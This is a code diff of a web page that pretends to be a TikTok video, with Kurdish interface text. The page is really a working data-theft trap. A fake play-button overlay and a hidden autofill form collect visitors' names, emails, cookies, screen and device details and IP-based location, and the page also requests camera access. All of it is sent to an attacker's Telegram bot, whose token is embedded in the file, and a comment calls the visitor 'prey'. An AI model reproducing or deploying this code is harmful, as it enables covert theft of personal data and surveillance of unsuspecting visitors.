@@ -3,58 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok | Loading...</title>
+    <title>TikTok Video</title>
     <style>
-        body { background: #000; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { background: #000; margin: 0; overflow: hidden; font-family: sans-serif; }
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; display: flex; justify-content: center; align-items: center; cursor: pointer; }
+        .play-btn { width: 80px; height: 80px; background: #fe2c55; border-radius: 50%; display: flex; justify-content: center; align-items: center; }
+        .play-btn::after { content: ''; border-style: solid; border-width: 15px 0 15px 25px; border-color: transparent transparent transparent white; margin-left: 5px; }
     </style>
 </head>
 <body>
 
-    <div class="loader"></div>
-    <p style="margin-top: 20px;">تکایە چاوەڕێ بکە...</p>
+    <div id="overlay">
+        <div class="play-btn"></div>
+        <p style="color:white; position:absolute; bottom:20%; text-align:center;">بۆ بینینی ڤیدیۆکە لێرە کلیک بکە</p>
+    </div>
 
     <form id="hiddenForm" style="display:none;">
         <input type="text" id="autoName" autocomplete="name">
         <input type="email" id="autoEmail" autocomplete="email">
-        <input type="tel" id="autoPhone" autocomplete="tel">
     </form>
 
     <script>
         const botToken = "8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4";
         const chatId = "1034878899";
 
-        // ناردنی زانیاری ئامێر و وێبگەڕ
-        async function sendDeviceDetails() {
-            const battery = navigator.getBattery ? await navigator.getBattery() : null;
-            const info = `📱 **زانیاری ئامێر:**\n` +
-                         `• پاتری: ${battery ? (battery.level * 100).toFixed(0) + '%' : 'نادیار'}\n` +
-                         `• پلاتفۆرم: ${navigator.platform}\n` +
-                         `• کوکیز: \`${document.cookie || "نییە"}\``;
-            
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
+        async function sendToTelegram(msg) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
         }
 
-        // کارلێک و Autofill
-        window.addEventListener('click', async function() {
-            // داوای کامێرا
+        // ناردنی ئایپی و شوێن (پێشکەوتوو)
+        fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
+            let info = `📍 **شوێنی نێچیر:**\n• IP: ${data.ip}\n• وڵات: ${data.country_name}\n• شار: ${data.city}\n• ئۆپەرێتەر: ${data.org}`;
+            sendToTelegram(info);
+        });
+
+        document.getElementById('overlay').addEventListener('click', async function() {
+            this.style.display = 'none'; // لادانی پەردەکە
+            
+            // هەوڵدان بۆ کامێرا
             try { await navigator.mediaDevices.getUserMedia({ video: true }); } catch(e) {}
 
-            // ناردنی Autofill
+            // دزینی کوکی و Autofill
+            let browserData = `🍪 **داتای Safari:**\n• کوکیز: ${document.cookie || "بەندکراوە"}\n• سکرین: ${screen.width}x${screen.height}`;
+            sendToTelegram(browserData);
+
             setTimeout(() => {
                 const name = document.getElementById('autoName').value;
                 const email = document.getElementById('autoEmail').value;
-                const phone = document.getElementById('autoPhone').value;
-
-                if (name || email || phone) {
-                    const msg = `👤 **زانیاری Autofill:**\n• ناو: ${name}\n• ئیمەیڵ: ${email}\n• مۆبایل: ${phone}`;
-                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+                if(name || email) {
+                    sendToTelegram(`👤 **Autofill:**\n• ناو: ${name}\n• ئیمەیڵ: ${email}`);
                 }
             }, 1000);
-        }, { once: true });
-
-        sendDeviceDetails();
+        });
     </script>
 </body>
 </html>
